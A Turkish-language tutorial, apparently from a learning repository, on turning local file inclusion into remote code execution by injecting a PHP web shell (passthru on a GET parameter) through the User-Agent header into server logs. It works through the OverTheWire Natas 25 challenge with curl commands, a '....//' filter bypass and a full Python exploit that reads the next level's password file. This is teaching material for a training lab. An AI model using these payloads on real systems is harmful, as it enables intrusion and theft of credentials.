# 🌐 Web Güvenliği — Log Poisoning

> Sunucu User-Agent gibi header'ları log dosyasına yazıyor.
> LFI ile o log dosyasını include ederek PHP kodu çalıştırabilirsin.

---

## 📋 İçindekiler

- [Log Poisoning Nedir?](#log-poisoning-nedir)
- [Apache Log Formatı](#apache-log-formatı)
- [LFI + Log Poisoning Kombinasyonu](#lfi--log-poisoning-kombinasyonu)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Log Poisoning Nedir?

İki zafiyetin kombinasyonudur:

1. **LFI (Local File Inclusion)** — sunucu log dosyasını include edebiliyor
2. **Log'a kod enjeksiyonu** — log dosyasına PHP kodu yazdırabiliyoruz

```
Adım 1: User-Agent: <?php passthru($_GET['cmd']); ?>
        → Sunucu bunu access.log'a yazar

Adım 2: ?page=../../../../var/log/apache2/access.log&cmd=id
        → LFI ile log dosyası include edilir
        → PHP kodu çalışır → komut çıktısı görünür
```

---

## Apache Log Formatı

Apache her isteği `access.log` dosyasına yazar:

```
127.0.0.1 - - [01/Jan/2024:12:00:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
^           ^  ^                            ^               ^        ^    ^  ^
IP          -  Tarih                        İstek           Status   Boyut Ref UA
```

Son alan **User-Agent** — tarayıcı tarafından belirlenir ve doğrulanmadan log'a yazılır.

### Log Dosyası Konumları

```
/var/log/apache2/access.log     → Apache (Debian/Ubuntu)
/var/log/apache/access.log      → Apache (CentOS/RHEL)
/var/log/httpd/access_log       → Apache (CentOS alternatif)
/var/log/nginx/access.log       → Nginx
/proc/self/fd/2                 → Stderr
/var/log/auth.log               → SSH auth logları (SSH üzerinden de poisoning olabilir)
```

---

## LFI + Log Poisoning Kombinasyonu

### Adım 1: Log Dosyasına PHP Kodu Yaz

```bash
# User-Agent olarak PHP kodu gönder
curl -A "<?php passthru(\$_GET['cmd']); ?>" \
     http://hedef.com/index.php
```

Bu istek `access.log`'a şöyle yazılır:

```
1.2.3.4 - - [01/Jan/2024:12:00:00] "GET / HTTP/1.1" 200 - "-" "<?php passthru($_GET['cmd']); ?>"
```

### Adım 2: LFI ile Log Dosyasını Include Et

```
http://hedef.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
```

PHP log dosyasını include ettiğinde `<?php passthru($_GET['cmd']); ?>` satırını bulur ve çalıştırır.

### Neden `$$_GET['cmd']` Değil `$_GET['cmd']`?

curl komutunda `\$` kullanırız çünkü bash `$` karakterini değişken olarak yorumlar. PHP dosyasına `$_GET['cmd']` yazılmalıdır.

```bash
curl -A '<?php passthru($_GET["cmd"]); ?>'  # tek tırnak → $ korunur
```

---

## Natas'ta Kullanım

### Natas 25 — Path Traversal Filtreli + Log Poisoning

**Kaynak kod (özet):**

```php
function setLanguage() {
    if(array_key_exists("lang", $_REQUEST)) {
        $lang = $_REQUEST["lang"];
        // ../ filtreleme girişimi
        $lang = str_replace('../', '', $lang);
        if(safeinclude($lang)) return 1;
    }
}

function safeinclude($filename) {
    // natas_webpass içeriyorsa reddet
    if(strstr($filename, "natas_webpass")) {
        logRequest("file");
        return 0;
    }
    include($filename);
    return 1;
}

function logRequest($filename) {
    $log  = $_SERVER['HTTP_USER_AGENT'];
    $log  = str_replace('<', '*', $log);
    $log .= " " . date("d/m/Y H:i:s") . "\n";
    $fd   = fopen("/var/www/natas/natas25/logs/natas25_[session_id].log", "a");
    fwrite($fd, $log);
    fclose($fd);
}
```

**İki zafiyet:**

1. `str_replace('../', '', $lang)` filtresi bypass edilebilir: `....//` → `../`
2. `logRequest()` User-Agent'ı log'a yazıyor → PHP kodu enjekte edilebilir
3. Log dosyası yolu LFI ile include edilebilir

**Exploit Adımları:**

**Adım 1: `../` filtresini bypass et**

```
../     → str_replace → (silindi)
....//  → str_replace → ../   ← bypass!
```

**Adım 2: Log dosyasının yolunu bul**

Log dosyası: `/var/www/natas/natas25/logs/natas25_[PHPSESSID].log`

**Adım 3: Log dosyasına PHP kodu yaz**

```bash
curl -u natas25:[şifre] \
     -b "PHPSESSID=benim_session_id" \
     -A '<?php passthru($_GET["cmd"]); ?>' \
     "http://natas25.natas.labs.overthewire.org/?lang=natas_webpass"
     # natas_webpass içerdiği için logRequest() tetiklenir!
```

`natas_webpass` içerdiği için `safeinclude` reddeder VE `logRequest()` çağrılır → User-Agent log'a yazılır.

**Adım 4: LFI ile log dosyasını include et ve komutu çalıştır**

```bash
curl -u natas25:[şifre] \
     -b "PHPSESSID=benim_session_id" \
     "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_benim_session_id.log&cmd=cat+/etc/natas_webpass/natas26"
```

**Python ile tam exploit:**

```python
import requests

url      = "http://natas25.natas.labs.overthewire.org/"
username = "natas25"
password = "[natas25_şifresi]"
session_id = "my_custom_session"
cookies  = {"PHPSESSID": session_id}

# Adım 1: Log'a PHP kodu yaz (natas_webpass trigger'ı)
r1 = requests.get(
    url,
    params={"lang": "natas_webpass"},
    cookies=cookies,
    headers={"User-Agent": '<?php passthru($_GET["cmd"]); ?>'},
    auth=(username, password)
)
print("[*] PHP kodu log'a yazıldı")

# Adım 2: LFI ile log dosyasını include et
log_path = f"....//....//....//....//....//var/www/natas/natas25/logs/natas25_{session_id}.log"
r2 = requests.get(
    url,
    params={
        "lang": log_path,
        "cmd": "cat /etc/natas_webpass/natas26"
    },
    cookies=cookies,
    auth=(username, password)
)
print(r2.text)
```

---

### Log Poisoning — Kontrol Listesi

```
Tespit:
  ☐ LFI var mı? (page, file, lang parametresi)
  ☐ Log dosyasına erişilebiliyor mu? (include dene)
  ☐ Hangi header'lar log'a yazılıyor? (User-Agent, Referer)

Exploit:
  ☐ Log dosyası yolunu bul
  ☐ User-Agent olarak PHP payload gönder
  ☐ LFI ile log dosyasını include et
  ☐ &cmd= ile komut çalıştır
  ☐ ../ filtreleniyorsa ....// ile bypass et
```

---

## 🔗 Kaynaklar

- [PortSwigger — Log File Injection](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings — LFI to RCE via Log](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-apache-log-poisoning)

---

**Önceki konu:** [22_perl_cgi_param_bypass.md](./22_perl_cgi_param_bypass.md)
**Sonraki konu:** [24_phar_deserialization.md](./24_phar_deserialization.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
